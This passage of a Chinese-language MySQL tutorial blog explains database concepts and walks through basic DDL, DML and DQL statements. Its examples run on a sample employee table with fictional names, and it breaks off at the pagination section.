<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql [-h 127.0.0.1] [-P 3306] -u root -p</span><br><span class="line">参数：</span><br><span class="line">-h : MySQL服务所在的主机IP</span><br><span class="line">-P : MySQL服务端口号， 默认3306</span><br><span class="line">-u : MySQL数据库用户名</span><br><span class="line">-p ： MySQL数据库用户名对应的密码</span><br></pre></td></tr></table></figure>

<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><h4 id="关系型数据库（RDBMS）"><a href="#关系型数据库（RDBMS）" class="headerlink" title="关系型数据库（RDBMS）"></a>关系型数据库（RDBMS）</h4><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库。 而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095014254.png" alt="image-20230303095014254"></p>
<p>特点： A. 使用表存储数据，格式统一，便于维护。 B. 使用SQL语言操作，标准统一，使用方便。</p>
<h4 id="数据模型-1"><a href="#数据模型-1" class="headerlink" title="数据模型"></a>数据模型</h4><p>MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图下：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095111026.png" alt="image-20230303095111026" style="zoom:50%;" />

<p>我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。</p>
<p> 可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。</p>
<p> 一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包 含多行记录。</p>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h2><p>1). SQL语句可以单行或多行书写，以分号结尾。</p>
<p> 2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>
<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>
<p>4). 注释： 单行注释：– 注释内容 或 # 注释内容 多行注释：&#x2F;*注释内容 *&#x2F;</p>
<h2 id="SQL分类"><a href="#SQL分类" class="headerlink" title="SQL分类"></a>SQL分类</h2><table>
<thead>
<tr>
<th align="center">分 类</th>
<th align="center">全称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DDL</td>
<td align="center">Data Definition Language</td>
<td align="center">数据定义语言，用来定义数据库对象(数据库，表， 字段)</td>
</tr>
<tr>
<td align="center">DML</td>
<td align="center">Data Manipulation Language</td>
<td align="center">数据操作语言，用来对数据库表中的数据进行增删改</td>
</tr>
<tr>
<td align="center">DQL</td>
<td align="center">Data Query Language</td>
<td align="center">数据查询语言，用来查询数据库中表的记录</td>
</tr>
<tr>
<td align="center">DCL</td>
<td align="center">Data Control Language</td>
<td align="center">数据控制语言，用来创建数据库用户、控制数据库的 访问权限</td>
</tr>
</tbody></table>
<h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>1). 查询所有数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases ;</span><br></pre></td></tr></table></figure>

<p>2). 查询当前数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database() ;</span><br></pre></td></tr></table></figure>

<p>3). 创建数据库 create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序 规则 ] ;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序</span><br><span class="line">规则 ] ;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A:创建一个itcast数据库, 使用数据库默认的字符集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itcast;</span><br><span class="line">create database if not extists itcast;</span><br></pre></td></tr></table></figure>

<p>B:创建一个itheima数据库，并且指定字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database itheima default charset utf8mb4;</span><br><span class="line">-- create database itheima default charset utf8;一般不建议使用utf-8</span><br></pre></td></tr></table></figure>

<p>4). 删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database [ if exists ] 数据库名 ;</span><br></pre></td></tr></table></figure>

<p>5). 切换数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 数据库名 ;</span><br><span class="line"># 可以使用select database();看自己当前使用的哪个数据库</span><br></pre></td></tr></table></figure>

<h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="查询创建"><a href="#查询创建" class="headerlink" title="查询创建"></a>查询创建</h4><p>1). 查询当前数据库所有表 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables; </span><br></pre></td></tr></table></figure>

<p>2). 查看指定表结构 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc 表名 ;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102245084.png" alt="image-20230303102245084"></p>
<p>通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信 息。</p>
<p> 3). 查询指定表的建表语句 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名 ;</span><br></pre></td></tr></table></figure>

<p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p>
<p>4). 创建表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE 表名(</span><br><span class="line">字段1 字段1类型 [ COMMENT 字段1注释 ],</span><br><span class="line">字段2 字段2类型 [COMMENT 字段2注释 ],</span><br><span class="line">字段3 字段3类型 [COMMENT 字段3注释 ],</span><br><span class="line">......</span><br><span class="line">字段n 字段n类型 [COMMENT 字段n注释 ]</span><br><span class="line">) [ COMMENT 表注释 ] ;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table tb_user(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">name varchar(50) comment &#x27;姓名&#x27;,</span><br><span class="line">age int comment &#x27;年龄&#x27;,</span><br><span class="line">gender varchar(1) comment &#x27;性别&#x27;</span><br><span class="line">) comment &#x27;用户表&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102945089.png" alt="image-20230303102945089"></p>
<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>参考菜鸟教程</p>
<p><a href="https://www.runoob.com/mysql/mysql-data-types.html">MySQL 数据类型 | 菜鸟教程 (runoob.com)</a></p>
<p>1). 数值类型</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大</span><br><span class="line">age tinyint unsigned</span><br><span class="line">2). 分数 -- 总分100分, 最多出现一位小数</span><br><span class="line">score double(4,1)</span><br></pre></td></tr></table></figure>

<p>2). 字符串类型</p>
<p>vchar性能比char要低一些</p>
<p>用户名：vchar</p>
<p>性别：char</p>
<p>3). 日期时间类型</p>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>设计一张员工信息表，要求如下：</p>
<ol>
<li>编号（纯数字） </li>
<li>员工工号 (字符串类型，长度不超过10位) </li>
<li>员工姓名（字符串类型，长度不超过10位） </li>
<li>性别（男&#x2F;女，存储一个汉字） </li>
<li>年龄（正常人年龄，不可能存储负数） </li>
<li>身份证号（二代身份证号均为18位，身份证中有X这样的字符） 入职时间（取值年月日即可）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table emp(</span><br><span class="line">    id int comment &quot;编号&quot;,</span><br><span class="line">    workno varchar(10) comment &quot;员工工号&quot;,</span><br><span class="line">    name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">	gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">	age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">	idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">	entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">) comment &quot;员工表&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>1). 添加字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: </p>
<p>为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp ADD nickname varchar(20) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>2). 修改数据类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure>

<p>3). 修改字段名和字段类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的nickname字段修改为username，类型为varchar(30)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>

<p>4). 删除字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure>

<p>案例: 将emp表的字段username删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp DROP username;</span><br></pre></td></tr></table></figure>

<p>5). 修改表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p> 将emp表的表名修改为 employee</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE emp RENAME TO employee;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>1). 删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE [ IF EXISTS ] 表名;</span><br><span class="line">DROP TABLE IF EXISTS tb_user;</span><br></pre></td></tr></table></figure>

<p>2). 删除指定表, 并重新创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE 表名;-- 在删除表的时候，表中的全部数据也都会被删除。</span><br></pre></td></tr></table></figure>

<h2 id="图形化界面工具"><a href="#图形化界面工具" class="headerlink" title="图形化界面工具"></a>图形化界面工具</h2><p>主流工具：sqlyog、Navicate、DataGrip</p>
<p>这次使用DataGrip</p>
<p>还挺好用，不会的sql可以在这里面看对于语句。</p>
<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="添加数据（INSERT）"><a href="#添加数据（INSERT）" class="headerlink" title="添加数据（INSERT）"></a>添加数据（INSERT）</h3><p>1). 给指定字段添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</span><br><span class="line">insert into employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class="line">values(1,&#x27;1&#x27;,&#x27;Itcast&#x27;,&#x27;男&#x27;,10,&#x27;123456789012345678&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class="line"></span><br><span class="line">insert into employee values(3,&#x27;3&#x27;,&#x27;韦一笑&#x27;,&#x27;男&#x27;,38,&#x27;123456789012345670&#x27;,&#x27;2005-01-</span><br><span class="line">01&#x27;),(4,&#x27;4&#x27;,&#x27;赵敏&#x27;,&#x27;女&#x27;,18,&#x27;123456789012345670&#x27;,&#x27;2005-01-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="修改数据（UPDATE）"><a href="#修改数据（UPDATE）" class="headerlink" title="修改数据（UPDATE）"></a>修改数据（UPDATE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ;</span><br><span class="line">update employee set name = &#x27;itheima&#x27; where id = 1;</span><br><span class="line">update employee set name = &#x27;小昭&#x27; , gender = &#x27;女&#x27; where id = 1;</span><br><span class="line">update employee set entrydate = &#x27;2008-01-01&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="删除数据（DELETE）"><a href="#删除数据（DELETE）" class="headerlink" title="删除数据（DELETE）"></a>删除数据（DELETE）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM 表名 [ WHERE 条件 ] ;</span><br><span class="line">delete from employee where gender = &#x27;女&#x27;;</span><br><span class="line">delete from employee;</span><br></pre></td></tr></table></figure>

<h2 id="DOL"><a href="#DOL" class="headerlink" title="DOL"></a>DOL</h2><p>DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</p>
<p>数据准备:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table if exists employee;</span><br><span class="line">create table emp(</span><br><span class="line">id int comment &#x27;编号&#x27;,</span><br><span class="line">workno varchar(10) comment &#x27;工号&#x27;,</span><br><span class="line">name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class="line">gender char(1) comment &#x27;性别&#x27;,</span><br><span class="line">age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class="line">idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class="line">workaddress varchar(50) comment &#x27;工作地址&#x27;,</span><br><span class="line">entrydate date comment &#x27;入职时间&#x27;</span><br><span class="line">)comment &#x27;员工表&#x27;;</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (1, &#x27;00001&#x27;, &#x27;柳岩666&#x27;, &#x27;女&#x27;, 20, &#x27;123456789012345678&#x27;, &#x27;北京&#x27;, &#x27;2000-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (2, &#x27;00002&#x27;, &#x27;张无忌&#x27;, &#x27;男&#x27;, 18, &#x27;123456789012345670&#x27;, &#x27;北京&#x27;, &#x27;2005-09-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (3, &#x27;00003&#x27;, &#x27;韦一笑&#x27;, &#x27;男&#x27;, 38, &#x27;123456789712345670&#x27;, &#x27;上海&#x27;, &#x27;2005-08-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (4, &#x27;00004&#x27;, &#x27;赵敏&#x27;, &#x27;女&#x27;, 18, &#x27;123456757123845670&#x27;, &#x27;北京&#x27;, &#x27;2009-12-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (5, &#x27;00005&#x27;, &#x27;小昭&#x27;, &#x27;女&#x27;, 16, &#x27;123456769012345678&#x27;, &#x27;上海&#x27;, &#x27;2007-07-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (6, &#x27;00006&#x27;, &#x27;杨逍&#x27;, &#x27;男&#x27;, 28, &#x27;12345678931234567X&#x27;, &#x27;北京&#x27;, &#x27;2006-01-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (7, &#x27;00007&#x27;, &#x27;范瑶&#x27;, &#x27;男&#x27;, 40, &#x27;123456789212345670&#x27;, &#x27;北京&#x27;, &#x27;2005-05-01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (8, &#x27;00008&#x27;, &#x27;黛绮丝&#x27;, &#x27;女&#x27;, 38, &#x27;123456157123645670&#x27;, &#x27;天津&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (9, &#x27;00009&#x27;, &#x27;范凉凉&#x27;, &#x27;女&#x27;, 45, &#x27;123156789012345678&#x27;, &#x27;北京&#x27;, &#x27;2010-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (10, &#x27;00010&#x27;, &#x27;陈友谅&#x27;, &#x27;男&#x27;, 53, &#x27;123456789012345670&#x27;, &#x27;上海&#x27;, &#x27;2011-01-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (11, &#x27;00011&#x27;, &#x27;张士诚&#x27;, &#x27;男&#x27;, 55, &#x27;123567897123465670&#x27;, &#x27;江苏&#x27;, &#x27;2015-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (12, &#x27;00012&#x27;, &#x27;常遇春&#x27;, &#x27;男&#x27;, 32, &#x27;123446757152345670&#x27;, &#x27;北京&#x27;, &#x27;2004-02-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (13, &#x27;00013&#x27;, &#x27;张三丰&#x27;, &#x27;男&#x27;, 88, &#x27;123656789012345678&#x27;, &#x27;江苏&#x27;, &#x27;2020-11-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (14, &#x27;00014&#x27;, &#x27;灭绝&#x27;, &#x27;女&#x27;, 65, &#x27;123456719012345670&#x27;, &#x27;西安&#x27;, &#x27;2019-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (15, &#x27;00015&#x27;, &#x27;胡青牛&#x27;, &#x27;男&#x27;, 70, &#x27;12345674971234567X&#x27;, &#x27;西安&#x27;, &#x27;2018-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (16, &#x27;00016&#x27;, &#x27;周芷若&#x27;, &#x27;女&#x27;, 18, null, &#x27;北京&#x27;, &#x27;2012-06-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">字段列表</span><br><span class="line">FROM</span><br><span class="line">表名列表</span><br><span class="line">WHERE</span><br><span class="line">条件列表</span><br><span class="line">GROUP BY</span><br><span class="line">分组字段列表</span><br><span class="line">HAVING</span><br><span class="line">分组后条件列表</span><br><span class="line">ORDER BY</span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure>

<p>基本查询（不带任何条件） 条件查询（WHERE） 聚合函数（count、max、min、avg、sum） 分组查询（group by） 排序查询（order by） 分页查询（limit）</p>
<h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><p>1). 查询多个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1, 字段2, 字段3 ... FROM 表名 ;</span><br><span class="line">SELECT * FROM 表名 ;</span><br></pre></td></tr></table></figure>

<p>2). 字段设置别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名;</span><br><span class="line">SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名;</span><br></pre></td></tr></table></figure>

<p>3). 去除重复记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT 字段列表 FROM 表名;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A. 查询指定字段 name, workno, age并返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,workno,age from emp;</span><br></pre></td></tr></table></figure>

<p>B. 查询返回所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;</span><br><span class="line">select * from emp;</span><br></pre></td></tr></table></figure>

<p>C. 查询所有员工的工作地址,起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress as &#x27;工作地址&#x27; from emp;</span><br><span class="line">-- as可以省略</span><br><span class="line">select workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<p>D. 查询公司员工的上班地址有哪些(不要重复)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 WHERE 条件列表 ;</span><br></pre></td></tr></table></figure>

<p>2). 条件</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230306090357474.png" alt="image-20230306090357474"></p>
<p>eg</p>
<p>A. 查询年龄等于 88 的员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 88;</span><br></pre></td></tr></table></figure>

<p>B. 查询年龄小于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt; 20;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于等于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt;= 20;</span><br></pre></td></tr></table></figure>

<p>D. 查询没有身份证号的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is null;</span><br></pre></td></tr></table></figure>

<p>E.查询有身份证号的员工信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is not null;</span><br></pre></td></tr></table></figure>

<p>F:查询年龄不等于 88 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age != 88;</span><br><span class="line">select * from emp where age &lt;&gt; 88;</span><br></pre></td></tr></table></figure>

<p>G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &gt;= 15 &amp;&amp; age &lt;= 20;</span><br><span class="line">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class="line">select * from emp where age between 15 and 20;</span><br></pre></td></tr></table></figure>

<p>H. 查询性别为 女 且年龄小于 25岁的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age &lt; 25;</span><br></pre></td></tr></table></figure>

<p>I. 查询年龄等于18 或 20 或 40 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 18 or age = 20 or age =40;</span><br><span class="line">select * from emp where age in(18,20,40);</span><br></pre></td></tr></table></figure>

<p>J. 查询姓名为两个字的员工信息 _ %</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>

<p>k. 查询身份证号最后一位是X的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard like &#x27;%X&#x27;;</span><br><span class="line">select * from emp where idcard like &#x27;_________________X&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>1). 介绍 将一列数据作为一个整体，进行纵向计算 。</p>
<p>2). 常见的聚合函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">count</td>
<td align="center">统计数量</td>
</tr>
<tr>
<td align="center">max</td>
<td align="center">最大值</td>
</tr>
<tr>
<td align="center">min</td>
<td align="center">最小值</td>
</tr>
<tr>
<td align="center">avg</td>
<td align="center">平均值</td>
</tr>
<tr>
<td align="center">sum</td>
<td align="center">求和</td>
</tr>
</tbody></table>
<p>A. 统计该企业员工数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from emp; -- 统计的是总记录数</span><br><span class="line">select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数</span><br></pre></td></tr></table></figure>

<p>B. 统计该企业员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select avg(age) from emp;</span><br></pre></td></tr></table></figure>

<p>C. 统计该企业员工的最大年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select max(age) from emp;</span><br></pre></td></tr></table></figure>

<p>D. 统计该企业员工的最小年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select min(age) from emp;</span><br></pre></td></tr></table></figure>

<p>E. 统计西安地区员工的年龄之和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sum(age) from emp where workaddress = &#x27;西安&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组</span><br><span class="line">后过滤条件 ];</span><br></pre></td></tr></table></figure>

<p>2). where与having区别</p>
<p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。 </p>
<p>判断条件不同：where不能对聚合函数进行判断，而having可以。</p>
<p>A. 根据性别分组 , 统计男性员工 和 女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, avg(age) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, count(*) address_count from emp where age &lt; 45 group by</span><br><span class="line">workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure>

<p>D. 统计各个工作地址上班的男性及女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, gender, count(*) &#x27;数量&#x27; from emp group by gender , workaddress</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;</span><br></pre></td></tr></table></figure>

<p>2). 排序方式</p>
<p>ASC : 升序(默认值) DESC: 降序</p>
<p>注意事项：</p>
<p> •如果是升序, 可以不指定排序方式ASC ; </p>
<p>• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</p>
<p>A. 根据年龄对公司的员工进行升序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc;</span><br><span class="line">select * from emp order by age;</span><br></pre></td></tr></table></figure>

<p>B. 根据入职时间, 对员工进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by entrydate desc;</span><br></pre></td></tr></table></figure>

<p>C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>1). 语法</p>
